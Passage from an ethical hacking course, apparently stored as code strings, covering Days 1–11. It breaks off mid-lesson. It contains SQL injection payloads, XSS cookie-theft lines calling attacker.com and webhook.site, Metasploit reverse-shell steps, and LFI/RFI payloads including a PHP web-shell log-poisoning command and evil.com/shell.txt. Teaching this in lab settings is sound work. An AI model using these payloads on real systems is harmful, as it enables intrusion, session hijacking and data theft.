    "- Day 86: EDR Evasion Techniques\n"
    "- Day 87: Command & Control with Flask\n"
    "- Day 88: Malware Analysis & IOC Extraction\n\n"

    "*📁 Bonus Tips:*\n"
    "- Practice in safe environments (e.g., TryHackMe, HackTheBox)\n"
    "- Use GitHub to track your hacks and notes\n"
    "- Pair this roadmap with real-world reports and CVEs\n"
    "- Stay updated with HackerOne, Bugcrowd, Exploit-DB\n\n"

    "*✅ Final Outcome:*\n"
    "- Able to perform real-world exploitation, red teaming & reporting\n"
    "- Ready to attempt OSCP, CRTP, PNPT, CEH, and more\n"
    "- Capable of hunting bugs, writing reports & creating tools\n"
    "- Confident in malware creation, bypasses, and mobile/web hacks\n",


    "day1": "*📅 Day 1: Introduction to Ethical Hacking & Lab Setup*\n\n"
            "Welcome to your ethical hacking journey! Today is all about understanding the foundations and setting up your safe hacking lab using virtual machines.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. **What is Ethical Hacking?**\n"
            "   - Ethical hacking involves legally probing systems for vulnerabilities.\n"
            "   - Purpose: Help organizations strengthen security by identifying weak points.\n\n"
            "2. **Types of Hackers:**\n"
            "   - **White Hat**: Ethical hackers who help improve security.\n"
            "   - **Black Hat**: Malicious hackers who exploit systems.\n"
            "   - **Gray Hat**: Hackers who operate in between (often without permission).\n\n"
            "3. **Why Set Up a Lab?**\n"
            "   - To practice safely without breaking laws\n"
            "   - Isolated environment for learning\n\n"
            "4. **Tools You’ll Use:**\n"
            "   - **VirtualBox** (virtualization software)\n"
            "   - **Kali Linux** (a Linux distro packed with hacking tools)\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. **Install VirtualBox:**\n"
            "   - Download: https://www.virtualbox.org/\n\n"
            "2. **Download Kali Linux ISO:**\n"
            "   - Official site: https://www.kali.org/get-kali/\n\n"
            "3. **Create & Configure a Kali Linux VM:**\n"
            "   - Recommended specs: 2GB RAM, 2 CPU cores, 20GB disk space\n"
            "   - Enable USB, network (NAT or Bridged), and install Guest Additions\n\n"
            "4. **First Boot of Kali Linux:**\n"
            "   - Username: `kali`, Password: `kali`\n"
            "   - Open terminal and run:\n"
            "     ```bash\n"
            "     sudo apt update && sudo apt upgrade -y\n"
            "     ```\n\n"
            "5. **Explore Basic Commands:**\n"
            "   ```bash\n"
            "   ls       # List files\n"
            "   pwd      # Print working directory\n"
            "   clear    # Clear the terminal\n"
            "   whoami   # Check current user\n"
            "   uname -a # View system info\n"
            "   ```\n\n"

            "*🎥 Suggested Videos:*\n"
            "- [🎓 Introduction to Ethical Hacking](https://youtu.be/3HjAwJ8PfIs?si=GPWl7TwGr2o5uZ21)\n"
            "- [🧠 Black Hat vs White Hat Hackers](https://youtu.be/8C9HmCnoV0E?si=SKYIjEZXWF0U2yMU)\n"
            "- [💻 Setting Up Kali Linux in VirtualBox](https://youtu.be/DfX5MB-zXEM?si=2jsbz8-Ce2bu15HF)\n\n"

            "*📁 Bonus Tips:*\n"
            "- Take a snapshot of the VM after setup (helps revert if needed)\n"
            "- Install basic tools like `net-tools`, `git`, and `curl` if missing\n"
            "  ```bash\n"
            "  sudo apt install net-tools git curl\n"
            "  ```\n"
            "- Enable shared clipboard in VirtualBox settings (useful for copying payloads)\n\n"

            "*✅ Outcome:*\n"
            "- You understand ethical hacking basics\n"
            "- Kali Linux VM is installed, updated, and ready for action\n"
            "- You are familiar with navigating the Linux terminal",

    "day2": "*📅 Day 2: Networking Essentials for Hackers*\n\n"
            "A hacker without networking knowledge is like a soldier without a weapon. Today, you'll understand how data flows across devices, what protocols matter, and how to observe traffic like a pro.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. **Networking Models:**\n"
            "   - OSI 7-Layer Model vs TCP/IP 4-Layer Model\n"
            "   - Role of each layer (Application, Transport, Network, etc.)\n\n"
            "2. **Network Identifiers:**\n"
            "   - MAC Address vs IP Address\n"
            "   - IPv4 vs IPv6\n"
            "   - Subnetting basics: CIDR notation (e.g., /24)\n"
            "   - Ports: Common ports (80, 443, 22, 21, 53, 137)\n\n"
            "3. **Network Services:**\n"
            "   - DNS, DHCP, HTTP, FTP, SSH, SMB\n"
            "   - How services run on ports (e.g., HTTP on port 80)\n\n"
            "4. **IP Addressing:**\n"
            "   - Public vs Private IP ranges\n"
            "   - NAT and why it matters in real-world hacking\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. **View IP and Interface Info:**\n"
            "   ```bash\n"
            "   ifconfig          # For older distros\n"
            "   ip a              # For modern distros\n"
            "   hostname -I       # Check your IP\n"
            "   ```\n\n"
            "2. **Run Basic Network Tools:**\n"
            "   ```bash\n"
            "   ping google.com               # Check connectivity\n"
            "   traceroute google.com        # Trace packet hops\n"
            "   netstat -tuln                # List open ports\n"
            "   nslookup google.com          # Check DNS resolution\n"
            "   ```\n\n"
            "3. **Use Nmap to Scan Your Own System:**\n"
            "   ```bash\n"
            "   nmap 127.0.0.1                # Scan localhost\n"
            "   nmap -sS -p 1-1000 192.168.0.1   # Stealth scan your router (in lab only)\n"
            "   ```\n\n"

            "*📁 Bonus Commands:*\n"
            "- View routing table:\n"
            "  ```bash\n"
            "  route -n\n"
            "  ```\n"
            "- Check listening services:\n"
            "  ```bash\n"
            "  ss -tuln\n"
            "  ```\n\n"

            "*🎥 Suggested Video:*\n"
            "[🌐 Networking Essentials for Hackers (by NetworkChuck)](https://youtu.be/xzGeiguILy8?si=GecBL6_EkyC9Z47d)\n\n"

            "*✅ Outcome:*\n"
            "- Understand how devices communicate across a network\n"
            "- Familiar with key protocols and port numbers\n"
            "- Able to diagnose connectivity, DNS, and port issues\n"
            "- Ready to start reconnaissance and scanning in later modules",

    "day3": "*📅 Day 3: Linux Basics for Hackers*\n\n"
            "Linux is the heart of hacking. Most penetration testing tools are designed for Linux, especially Kali Linux and Parrot OS. Today you'll learn essential terminal commands every hacker must master.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. **Linux Directory Structure:**\n"
            "   - `/etc`: Configuration files\n"
            "   - `/var`: Logs, variable data\n"
            "   - `/usr`: User-installed software\n"
            "   - `/home`: User directories\n\n"
            "2. **Basic File & Directory Commands:**\n"
            "   - `ls`, `cd`, `pwd`, `mkdir`, `rmdir`\n"
            "   - `touch`, `rm`, `mv`, `cp`\n\n"
            "3. **Permissions and Ownership:**\n"
            "   - `chmod`, `chown`, `ls -l`\n"
            "   - Read (r), write (w), execute (x)\n"
            "   - Numeric permissions: 777, 755, 644\n\n"
            "4. **Piping, Redirection & Wildcards:**\n"
            "   - `|`, `>`, `>>`, `2>`, `<`\n"
            "   - `grep`, `cut`, `head`, `tail`, `sort`, `uniq`\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. **Navigate and List Files:**\n"
            "   ```bash\n"
            "   cd /etc\n"
            "   ls -la\n"
            "   pwd\n"
            "   ```\n"
            "2. **Create and Manage Files:**\n"
            "   ```bash\n"
            "   mkdir testfolder\n"
            "   touch test.txt\n"
            "   mv test.txt testfolder/\n"
            "   rm -rf testfolder/\n"
            "   ```\n"
            "3. **Permissions and Execution:**\n"
            "   ```bash\n"
            "   chmod +x script.sh\n"
            "   chmod 755 mytool.sh\n"
            "   chown user:user file.txt\n"
            "   ```\n"
            "4. **Pipe & Filter:**\n"
            "   ```bash\n"
            "   cat /etc/passwd | grep root\n"
            "   ps aux | grep apache\n"
            "   ls -l /var/log | sort -k5 -n\n"
            "   ```\n"

            "*📁 Bonus Exercises:*\n"
            "- View the last 10 lines of a log file:\n"
            "  ```bash\n"
            "  tail -n 10 /var/log/syslog\n"
            "  ```\n"
            "- Find files modified in the last 24 hours:\n"
            "  ```bash\n"
            "  find /home -mtime -1\n"
            "  ```\n"
            "- Search recursively for a keyword:\n"
            "  ```bash\n"
            "  grep -R 'password' /etc\n"
            "  ```\n\n"

            "*🎥 Suggested Video:*\n"
            "[🐧 Linux Basics for Hackers (by NetworkChuck)](https://youtu.be/PhYmmD84oFY?si=i2ggx3NdzXZZL4kq)\n\n"

            "*✅ Outcome:*\n"
            "- Confidently navigate and manipulate the Linux filesystem\n"
            "- Understand permission schemes and secure file access\n"
            "- Use piping and filtering to extract information — essential for hacking tools\n"
            "- Prepare to automate tasks and chain commands like a pro",

    "day4": "*📅 Day 4: Bash Scripting & Automation*\n\n"
            "Hackers love automation. Bash scripting allows you to speed up repetitive tasks like scanning, logging, backups, and exploitation. Today, we’ll dive into scripting basics and automate real-world tasks.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. **Introduction to Bash:**\n"
            "   - What is Bash and why it’s used in Linux automation\n"
            "   - Shebang (`#!/bin/bash`) explanation\n\n"
            "2. **Basic Bash Concepts:**\n"
            "   - Variables: `name=\"Hacker\"`\n"
            "   - Conditions: `if`, `else`, `elif`\n"
            "   - Loops: `for`, `while`\n"
            "   - Input/Output: `read`, `echo`, `>` `>>`\n"
            "   - Functions: `function myscan() {}`\n\n"

            "3. **Practical Applications in Hacking:**\n"
            "   - Automate recon (ping sweep, port scan)\n"
            "   - Automate backups and logging\n"
            "   - Schedule tasks using `crontab`\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. **Write a Bash Script to Ping a Subnet:**\n"
            "```bash\n"
            "#!/bin/bash\n"
            "echo \"🔍 Scanning IPs from 192.168.0.1 to 192.168.0.10\"\n"
            "for ip in {1..10}; do\n"
            "  ping -c 1 192.168.0.$ip &> /dev/null\n"
            "  if [ $? -eq 0 ]; then\n"
            "    echo \"✅ Host 192.168.0.$ip is up\"\n"
            "  else\n"
            "    echo \"❌ Host 192.168.0.$ip is down\"\n"
            "  fi\n"
            "done\n"
            "```\n\n"

            "2. **Automate File Backup Script:**\n"
            "```bash\n"
            "#!/bin/bash\n"
            "src=\"/home/hacker/documents\"\n"
            "dest=\"/home/hacker/backup\"\n"
            "mkdir -p $dest\n"
            "cp -r $src/* $dest/\n"
            "echo \"📁 Backup completed on $(date)\" >> $dest/backup.log\n"
            "```\n\n"

            "3. **Use Crontab to Schedule the Script:**\n"
            "   - Open crontab:\n"
            "     ```bash\n"
            "     crontab -e\n"
            "     ```\n"
            "   - Add job to run script every day at 6 PM:\n"
            "     ```bash\n"
            "     0 18 * * * /home/hacker/backup.sh\n"
            "     ```\n\n"

            "*📁 Bonus: Create a Recon Automation Script (Google Dorks + Whois)*\n"
            "```bash\n"
            "#!/bin/bash\n"
            "echo \"[+] WHOIS Lookup\"\n"
            "whois example.com\n\n"
            "echo \"[+] Google Dork Search\"\n"
            "echo \"site:example.com inurl:login\"\n"
            "```\n\n"

            "*🎥 Suggested Video:* \n"
            "[🛠️ Bash Scripting Full Tutorial for Beginners (by NetworkChuck)](https://youtu.be/CeCah9nD9XE?si=AYk7mkZ4gM2nmZVP)\n\n"

            "*✅ Outcome:*\n"
            "- You’ll be able to write custom bash scripts\n"
            "- Automate recon, backup, or system tasks\n"
            "- Schedule your tools to run hands-free using cron jobs\n"
            "- Lay the foundation for larger hacking automation projects",

"day5": "*📅 Day 5: Footprinting and Reconnaissance*\n\n"  
    "Footprinting and reconnaissance is the first and most crucial phase in the hacking lifecycle. This stage focuses on gathering information about the target system or organization to discover potential attack vectors. It can be performed passively (without interacting directly with the target) or actively (direct interaction with the target system).\n\n"  

    "*🧠 Topics Covered:*\n"
    "1. Passive vs Active Reconnaissance\n"
    "   - *Passive Recon:* Collecting information without direct engagement (e.g., using public sources like WHOIS, search engines).\n"
    "   - *Active Recon:* Involves direct interaction with the target (e.g., port scanning, banner grabbing).\n"
    "2. WHOIS Lookup\n"
    "   - Learn who owns a domain, registrar, contact info, and important dates.\n"
    "3. DNS Records\n"
    "   - Understand different DNS record types (A, MX, TXT, NS, SOA, CNAME).\n"
    "4. Google Dorking\n"
    "   - Using advanced Google queries to find sensitive data exposed on websites.\n"
    "5. Social Engineering Basics\n"
    "   - Psychological techniques to manipulate individuals into revealing confidential info.\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Use WHOIS to get domain info:\n"
    "   ```bash\n"
    "   whois example.com\n"
    "   ```\n"
    "   - Check registrar, registrant details, creation & expiry dates.\n\n"

    "2. Use DNS interrogation tools:\n"
    "   - `nslookup`: Basic DNS query tool\n"
    "     ```bash\n"
    "     nslookup example.com\n"
    "     ```\n"
    "   - `dig`: Advanced DNS lookup\n"
    "     ```bash\n"
    "     dig example.com any\n"
    "     dig mx example.com\n"
    "     dig ns example.com\n"
    "     ```\n"
    "   - `host`: Simple DNS resolver\n"
    "     ```bash\n"
    "     host -a example.com\n"
    "     ```\n\n"

    "3. Google Dorking Practice:\n"
    "   Try these advanced Google queries to uncover sensitive data:\n"
    "   - `site:example.com intitle:login`\n"
    "   - `inurl:admin filetype:php`\n"
    "   - `site:example.com filetype:pdf`\n"
    "   - `intitle:index.of` (Find open directories)\n\n"

    "4. Install and use `theHarvester` for email and domain recon:\n"
    "   - Install via Kali or pip:\n"
    "     ```bash\n"
    "     sudo apt install theharvester\n"
    "     # or\n"
    "     pip install theHarvester\n"
    "     ```\n"
    "   - Usage example:\n"
    "     ```bash\n"
    "     theHarvester -d example.com -l 100 -b google\n"
    "     ```\n"
    "     - `-d`: Domain\n"
    "     - `-l`: Limit the number of results\n"
    "     - `-b`: Source engine (google, bing, baidu, etc.)\n\n"

    "5. (Bonus) Explore tools like:\n"
    "   - `Maltego`: Visual link analysis tool for deep OSINT.\n"
    "   - `Shodan`: Search engine for IoT and internet-connected devices.\n"
    "   - `Recon-ng`: Full-featured Web Recon Framework in Python.\n\n"

    "*✅ Outcome:*\n"
    "You will be able to:\n"
    "- Distinguish between active and passive reconnaissance methods.\n"
    "- Perform domain information lookups using WHOIS.\n"
    "- Extract DNS records and understand domain infrastructure.\n"
    "- Use Google Dorking to find hidden or sensitive information.\n"
    "- Leverage tools like `theHarvester` to collect emails, hosts, and subdomains.\n"
    "- Begin building a complete intelligence profile of your target without triggering alerts.\n",


"day6": "*📅 Day 6: Scanning & Enumeration*\n\n"
    "Scanning and enumeration are essential phases in ethical hacking after reconnaissance. These stages involve actively interacting with the target to uncover live hosts, open ports, running services, and potential vulnerabilities. Enumeration digs deeper to extract specific information like usernames, network shares, and more.\n\n"

    "*🧠 Topics Covered:*\n"
    "1. Types of Scans:\n"
    "   - *SYN Scan (-sS):* Stealth scan that sends SYN packets and analyzes responses.\n"
    "   - *TCP Connect Scan (-sT):* Full TCP handshake; more detectable.\n"
    "   - *UDP Scan (-sU):* Detects services running over UDP; slower and less reliable.\n\n"
    "2. Banner Grabbing:\n"
    "   - Identifying service versions by capturing text banners from ports (e.g., HTTP, FTP, SMTP).\n\n"
    "3. Enumeration Techniques:\n"
    "   - *SMB Enumeration:* Extract usernames, shares, and system details.\n"
    "   - *SNMP Enumeration:* Useful for devices using Simple Network Management Protocol.\n"
    "   - *NetBIOS and RPC Enumeration:* Retrieve information about shares, sessions, and services.\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Nmap for Scanning:\n"
    "   ```bash\n"
    "   nmap -sS -sV -T4 target_ip\n"
    "   ```\n"
    "   - `-sS`: SYN Stealth Scan\n"
    "   - `-sV`: Version Detection\n"
    "   - `-T4`: Faster execution\n\n"

    "2. SMB Enumeration with enum4linux:\n"
    "   ```bash\n"
    "   enum4linux -a target_ip\n"
    "   ```\n"
    "   - Retrieves user list, shares, policies, and OS info via SMB.\n\n"

    "3. Banner Grabbing:\n"
    "   - Using Telnet:\n"
    "     ```bash\n"
    "     telnet target_ip 80\n"
    "     ```\n"
    "   - Using Netcat:\n"
    "     ```bash\n"
    "     nc target_ip 80\n"
    "     ```\n"
    "   - With Nmap Scripting Engine (NSE):\n"
    "     ```bash\n"
    "     nmap -sV --script=banner target_ip\n"
    "     ```\n\n"

    "*💡 Suggested Tools:*\n"
    "- `Nmap`: All-purpose scanner\n"
    "- `enum4linux`: SMB enumeration tool\n"
    "- `Netcat` and `Telnet`: Manual banner grabbing\n"
    "- `rpcclient`, `nbtscan`, `smbclient`: Additional enumeration tools\n\n"

    "*📺 Suggested YouTube Video:*\n"
    "[🎥 Scanning and Enumeration - Ethical Hacking Course (by NetworkChuck)](https://www.youtube.com/watch?v=E8Z6Uwb5L_4)\n\n"

    "*✅ Outcome:*\n"
    "By the end of this day, you'll be able to:\n"
    "- Perform TCP/UDP scans to detect live hosts and open ports\n"
    "- Identify service versions through banner grabbing\n"
    "- Enumerate system details, usernames, and shares\n"
    "- Understand the risks exposed through open and misconfigured services\n",

    "day7": "*📅 Day 7: Vulnerability Scanning*\n\n"
            "Vulnerability scanning involves identifying security weaknesses in systems, networks, and applications. It is an essential part of a secure development lifecycle and helps in prioritizing remediation steps before an attacker finds them.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. What is Vulnerability Scanning?\n"
            "   - Automated process of probing systems for known vulnerabilities (e.g., outdated software, misconfigurations, unpatched services).\n"
            "   - Unlike manual pentesting, scanners rely on vulnerability databases like CVE/NVD.\n\n"
            "2. Types of Vulnerabilities:\n"
            "   - *Software Vulnerabilities:* Outdated or unpatched versions (e.g., Apache, MySQL).\n"
            "   - *Configuration Issues:* Weak or default credentials, exposed services.\n"
            "   - *Missing Security Controls:* Lack of firewalls, no encryption, etc.\n\n"
            "3. Tools for Vulnerability Scanning:\n"
            "   - *Nessus:* Industry-leading commercial scanner (Free for home use)\n"
            "   - *OpenVAS:* Fully open-source alternative integrated in Greenbone Security Assistant\n"
            "   - *Nikto:* Web server vulnerability scanner\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. Install Nessus on Kali Linux:\n"
            "   - Download from: https://www.tenable.com/products/nessus\n"
            "   ```bash\n"
            "   sudo dpkg -i Nessus-*.deb\n"
            "   sudo systemctl start nessusd\n"
            "   sudo systemctl enable nessusd\n"
            "   # Access on browser: https://localhost:8834\n"
            "   ```\n\n"

            "2. Perform a Basic Vulnerability Scan:\n"
            "   - After logging into Nessus web panel:\n"
            "     - Choose 'Basic Network Scan'\n"
            "     - Enter your target (e.g., `127.0.0.1` for localhost)\n"
            "     - Launch the scan and wait for results\n\n"

            "3. Analyze Vulnerability Report:\n"
            "   - Look for severity ratings (Critical, High, Medium, Low)\n"
            "   - Identify CVEs (Common Vulnerabilities and Exposures) with links to exploit references\n"
            "   - Export the report in HTML or PDF format for documentation\n\n"

            "*💡 Additional Tools to Explore:*\n"
            "- `OpenVAS`: Run via `gvm-setup` and `gvm-start`\n"
            "- `Nikto`: \n"
            "  ```bash\n"
            "  nikto -h http://target_ip\n"
            "  ```\n"
            "- `Nmap NSE Scripts` for quick vuln scans:\n"
            "  ```bash\n"
            "  nmap --script vuln target_ip\n"
            "  ```\n\n"

            "*📺 Suggested YouTube Video:*\n"
            "[🎥 How to Use Nessus for Vulnerability Scanning (by David Bombal)](https://www.youtube.com/watch?v=baBRxY1c3YI)\n\n"

            "*✅ Outcome:*\n"
            "You will be able to:\n"
            "- Install and configure a vulnerability scanner (Nessus/OpenVAS)\n"
            "- Perform full scans on targets to detect known vulnerabilities\n"
            "- Analyze scan reports and understand associated CVEs\n"
            "- Prioritize findings for remediation or further exploitation in penetration testing\n",

    "day8": "*📅 Day 8: Exploitation Basics with Metasploit*\n\n"
            "Exploitation is the process of taking advantage of a vulnerability to gain unauthorized access or control over a system. Today, you'll begin learning the basics of this phase using the most popular exploitation framework — Metasploit.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. What is Metasploit?\n"
            "   - Metasploit is a powerful, open-source penetration testing framework used to develop, test, and execute exploits against remote targets.\n"
            "   - It includes hundreds of exploits, payloads, auxiliary tools, and post-exploitation modules.\n\n"
            "2. msfconsole Basics:\n"
            "   - Primary command-line interface of Metasploit.\n"
            "   - Supports searching modules, loading exploits, setting options, and executing attacks.\n\n"
            "3. Exploit Modules & Payloads:\n"
            "   - *Exploit:* The code that takes advantage of a specific vulnerability.\n"
            "   - *Payload:* The code that runs after successful exploitation (e.g., reverse shell).\n"
            "   - *Auxiliary:* Useful tools for scanning, fuzzing, sniffing, etc.\n"
            "   - *Post Modules:* Run after exploiting a system for tasks like privilege escalation or gathering credentials.\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. Start Metasploit Console:\n"
            "   ```bash\n"
            "   msfconsole\n"
            "   ```\n\n"

            "2. Search & Load a Known Exploit:\n"
            "   - Example: Exploit for the SMB vulnerability in Windows XP (MS08-067)\n"
            "   ```bash\n"
            "   search ms08_067\n"
            "   use exploit/windows/smb/ms08_067_netapi\n"
            "   ```\n\n"

            "3. Set Payload and Target Info:\n"
            "   ```bash\n"
            "   set payload windows/meterpreter/reverse_tcp\n"
            "   set LHOST your_local_ip\n"
            "   set RHOST target_ip\n"
            "   run\n"
            "   ```\n"
            "   - `LHOST`: Your attacker machine’s IP address (e.g., Kali Linux)\n"
            "   - `RHOST`: The target machine IP address\n\n"

            "4. (Optional) Use a vulnerable machine like Metasploitable2 or Windows XP SP2 VM to test safely.\n\n"

            "*💡 Additional Commands:*\n"
            "- `show options` → View and configure required parameters\n"
            "- `show payloads` → List all compatible payloads\n"
            "- `sessions -i` → Interact with a successful session\n\n"

            "*📺 Suggested YouTube Video:*\n"
            "[🎥 Metasploit for Beginners | Full Hands-On Guide (by The Cyber Mentor)](https://www.youtube.com/watch?v=1lwddP0KUEg)\n\n"

            "*✅ Outcome:*\n"
            "You will be able to:\n"
            "- Understand how Metasploit works and its core components\n"
            "- Launch Metasploit and interact with its modules\n"
            "- Select and run a basic exploit with a payload\n"
            "- Gain a reverse shell or Meterpreter session on a vulnerable system\n"
            "- Perform safe, legal exploitation for educational purposes in a controlled lab setup\n",

    "day9": "*📅 Day 9: Exploiting Web Applications (SQL Injection)*\n\n"
            "SQL Injection (SQLi) is one of the most common and dangerous web application vulnerabilities. It allows attackers to manipulate SQL queries to bypass authentication, retrieve, modify, or delete data from databases.\n\n"

            "*🧠 Topics Covered:*\n"
            "1. Introduction to SQL Injection:\n"
            "   - SQLi occurs when user input is improperly sanitized and gets executed as part of a SQL query.\n"
            "   - Impacts include login bypass, database dumps, data deletion, and even remote code execution in some cases.\n\n"
            "2. Finding Injectable Parameters:\n"
            "   - Look for GET/POST inputs (e.g., search bars, login forms).\n"
            "   - Add `'` or `\"` to inputs and observe for SQL errors.\n"
            "   - Use Burp Suite to intercept and analyze requests.\n\n"
            "3. Manual SQLi Techniques:\n"
            "   - Authentication Bypass:\n"
            "     ```sql\n"
            "     ' OR 1=1 -- \n"
            "     ' OR 'a'='a\n"
            "     ```\n"
            "   - UNION-Based SQLi:\n"
            "     ```sql\n"
            "     ' UNION SELECT 1,2,3 -- \n"
            "     ' UNION SELECT null, username, password FROM users -- \n"
            "     ```\n"
            "   - Error-Based SQLi:\n"
            "     - Use intentionally incorrect syntax to reveal DB errors\n"
            "     - Extract database names, table names, etc.\n\n"

            "*🛠️ Practical Tasks:*\n"
            "1. Set Up DVWA (Damn Vulnerable Web App):\n"
            "   - Use XAMPP, MAMP, or install via Kali Linux:\n"
            "     ```bash\n"
            "     git clone https://github.com/digininja/DVWA.git\n"
            "     cd DVWA\n"
            "     sudo cp -r * /var/www/html/\n"
            "     ```\n"
            "   - Configure `config.inc.php`, create database, and set security to 'Low'\n\n"

            "2. Perform Basic SQL Injection:\n"
            "   - Go to DVWA → SQL Injection page\n"
            "   - Try basic payloads:\n"
            "     ```sql\n"
            "     1' OR 1=1 -- \n"
            "     ' UNION SELECT 1,2,3 -- \n"
            "     ```\n\n"

            "3. Extract Data via Error-Based SQLi:\n"
            "   - Use crafted input to reveal database information through error messages\n"
            "   - Example:\n"
            "     ```sql\n"
            "     1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a) -- \n"
            "     ```\n\n"

            "*💡 Tips & Tools:*\n"
            "- Use browser plugins like *HackBar* for quick SQLi testing.\n"
            "- Use *Burp Suite* or *OWASP ZAP* for request interception.\n"
            "- Explore automated tools later (e.g., sqlmap — will be covered soon).\n\n"

            "*📺 Suggested YouTube Video:*\n"
            "[🎥 SQL Injection Full Walkthrough using DVWA (by InfoSec Pat)](https://www.youtube.com/watch?v=ciNHn38EyRc)\n\n"

            "*✅ Outcome:*\n"
            "By the end of today, you will be able to:\n"
            "- Understand how SQL Injection works\n"
            "- Identify vulnerable parameters manually\n"
            "- Execute SQL payloads to extract data\n"
            "- Set up and test SQLi on DVWA in a safe lab environment\n",

    "day10": "*📅 Day 10: XSS (Cross Site Scripting)*\n\n"
             "Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to execute malicious JavaScript in the victim's browser. It can be used to steal cookies, hijack sessions, redirect users, and more.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. Types of XSS:\n"
             "   - *Reflected XSS:* Injected code is reflected in the server response (e.g., in URL parameters).\n"
             "   - *Stored XSS:* Payload is stored on the server (e.g., in comments, messages) and executes when a user visits the page.\n"
             "   - *DOM-Based XSS:* Triggered by manipulating the DOM on the client side without server involvement.\n\n"
             "2. Common Payloads:\n"
             "   - Basic Alert:\n"
             "     ```html\n"
             "     <script>alert(1)</script>\n"
             "     ```\n"
             "   - Cookie Theft (for educational/demo purposes only):\n"
             "     ```html\n"
             "     <script>fetch('http://attacker.com?c='+document.cookie)</script>\n"
             "     ```\n"
             "   - Redirect:\n"
             "     ```html\n"
             "     <script>window.location='http://evil.com'</script>\n"
             "     ```\n\n"
             "3. Bypassing Filters:\n"
             "   - Use HTML entity encoding:\n"
             "     ```html\n"
             "     <img src=x onerror=alert(1)>\n"
             "     ```\n"
             "   - Use event handlers:\n"
             "     ```html\n"
             "     <body onload=alert(1)>\n"
             "     ```\n"
             "   - Use malformed or obfuscated payloads to bypass simple input sanitization.\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. Set up a vulnerable app:\n"
             "   - Use *DVWA* (Damn Vulnerable Web App) or *bWAPP*.\n"
             "   - Set XSS security level to 'Low' for testing.\n\n"
             "2. Test Basic Reflected XSS:\n"
             "   - Input field:\n"
             "     ```html\n"
             "     <script>alert('XSS')</script>\n"
             "     ```\n\n"
             "3. Demonstrate Cookie Access:\n"
             "   - Inject the following to display your cookie:\n"
             "     ```html\n"
             "     <script>alert(document.cookie)</script>\n"
             "     ```\n"
             "   - Or send it to a webhook (like webhook.site) for proof of concept:\n"
             "     ```html\n"
             "     <script>fetch('https://webhook.site/your-id?cookie='+document.cookie)</script>\n"
             "     ```\n\n"

             "*💡 Pro Tips:*\n"
             "- Use browser extensions like *XSS Me* or *XSStrike*.\n"
             "- Use *Burp Suite* to intercept and test reflected XSS in URL/query parameters.\n"
             "- Always test in a safe, local environment. Never try on live websites without permission!\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 What is XSS? Cross Site Scripting Explained (by HackerSploit)](https://www.youtube.com/watch?v=2b5j3R6Jv0E)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Understand different types of XSS and how they work\n"
             "- Test for XSS using common and obfuscated payloads\n"
             "- Use tools like DVWA and bWAPP to safely practice\n"
             "- Understand how attackers could steal cookies or perform redirects via XSS\n",

    "day11": "*📅 Day 11: File Inclusion Vulnerabilities (LFI/RFI)*\n\n"
             "File Inclusion vulnerabilities allow attackers to include files on a server through the web browser. These vulnerabilities are common in PHP applications and can lead to serious attacks like information disclosure, code execution, or even full server compromise.\n\n"

             "*🧠 Topics Covered:*\n"
             "1. What is LFI (Local File Inclusion)?\n"
             "   - Allows an attacker to include and read files from the local server.\n"
             "   - Common in PHP functions like `include()`, `require()`, etc.\n\n"
             "2. What is RFI (Remote File Inclusion)?\n"
             "   - Allows inclusion of external (remote) files — often leading to remote code execution.\n"
             "   - RFI must be enabled via insecure configuration like `allow_url_include=On` in PHP.\n\n"
             "3. Directory Traversal:\n"
             "   - Exploits relative file paths to escape the web root.\n"
             "   - Payload example:\n"
             "     ```php\n"
             "     ?page=../../../../etc/passwd\n"
             "     ```\n\n"
             "4. Practical Payloads:\n"
             "   - Basic LFI:\n"
             "     ```php\n"
             "     ?page=../../../../etc/passwd\n"
             "     ```\n"
             "   - Log Poisoning for RCE:\n"
             "     - Inject PHP into access logs and include them:\n"
             "     ```bash\n"
             "     curl -A \"<?php system($_GET['cmd']); ?>\" http://target.com\n"
             "     http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id\n"
             "     ```\n"
             "   - RFI (if allowed):\n"
             "     ```php\n"
             "     ?page=http://evil.com/shell.txt\n"
             "     ```\n\n"

             "*🛠️ Practical Tasks:*\n"
             "1. Set Up Vulnerable App:\n"
             "   - Use *DVWA*, *bWAPP*, or a custom vulnerable PHP script with:\n"
             "     ```php\n"
             "     include($_GET['page']);\n"
             "     ```\n"
             "   - Set DVWA security level to 'Low'.\n\n"
             "2. Test for Local File Inclusion (LFI):\n"
             "   - Try accessing system files:\n"
             "     ```php\n"
             "     ?page=../../../../etc/passwd\n"
             "     ?page=../../../../proc/self/environ\n"
             "     ```\n\n"
             "3. Test for Remote File Inclusion (RFI):\n"
             "   - If server allows it:\n"
             "     ```php\n"
             "     ?page=http://yourserver.com/malicious.txt\n"
             "     ```\n"
             "   - Use tools like `ngrok` or Python's HTTP server to host the remote file.\n\n"

             "*💡 Extra Tools and Tips:*\n"
             "- Use `Burp Suite` to test file inclusion parameters.\n"
             "- Enable Apache logging to test log poisoning (if practicing locally).\n"
             "- Always ensure `allow_url_include` is OFF on production servers.\n\n"

             "*📺 Suggested YouTube Video:*\n"
             "[🎥 LFI and RFI Explained with Hands-On (by The Cyber Mentor)](https://www.youtube.com/watch?v=1AboJwKjx2o)\n\n"

             "*✅ Outcome:*\n"
             "By the end of today, you will be able to:\n"
             "- Identify and test for Local and Remote File Inclusion vulnerabilities\n"
             "- Use traversal techniques to access sensitive files\n"
